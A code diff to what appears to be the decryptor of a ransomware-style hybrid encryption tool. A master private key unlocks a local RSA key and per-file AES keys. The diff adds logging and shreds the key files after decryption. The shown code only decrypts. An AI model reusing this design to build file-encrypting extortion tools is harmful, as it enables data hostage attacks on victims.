@@ -1,4 +1,5 @@
 import os
+import logging
 from base64 import b64decode
 from .symmetric_encryption import AES
 from .asymmetric_encryption import RSA
@@ -9,9 +10,12 @@ from .config import ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, \
                     UNENCRYPTED_AES_KEY_FILE_LOCATION
 from . import utils
 
+logger = logging.getLogger(__name__)
+
 
 # TODO: Local RSA key decryption should happen in the server side
 def decrypt_local_rsa_key():
+    logger.info("Decrypting local RSA key")
     encrypted_local_rsa_key_parts = utils.read_data_from_file(ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION, serialized=False)
     cipher = RSA(private_key=MASTER_PRIVATE_KEY)
     unencrypted_local_private_key = b"".join([cipher.decrypt_data(key_part) for key_part in encrypted_local_rsa_key_parts])
@@ -42,12 +46,18 @@ def decode_file_encryption_details(detail):
 
 
 def decrypt_file(aes_key, initialization_vector, encrypted_file_path):
+    logger.info(f"Decrypting file: {encrypted_file_path}")
     cipher = AES(aes_key, initialization_vector)
     encrypted_data = utils.read_data_from_file(encrypted_file_path)
     data = cipher.decrypt_data(encrypted_data)
     original_file_path = os.path.splitext(encrypted_file_path)[0]
     utils.write_data_to_file(original_file_path, data)
     utils.shred_file(encrypted_file_path)
+
+
+def delete_key_files():
+    utils.shred_file(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION)
+    utils.shred_file(UNENCRYPTED_AES_KEY_FILE_LOCATION)
 
 
 def decrypt_files():
@@ -60,9 +70,10 @@ def decrypt_files():
 def start_decryption():
     decrypt_local_rsa_key()
     if not os.path.exists(UNENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION):
-        print("Unencrypted RSA key not found")
+        logger.info("Unencrypted RSA key not found")
         return
     decrypt_file_encryption_details()
     decrypt_files()
+    delete_key_files()
 
 
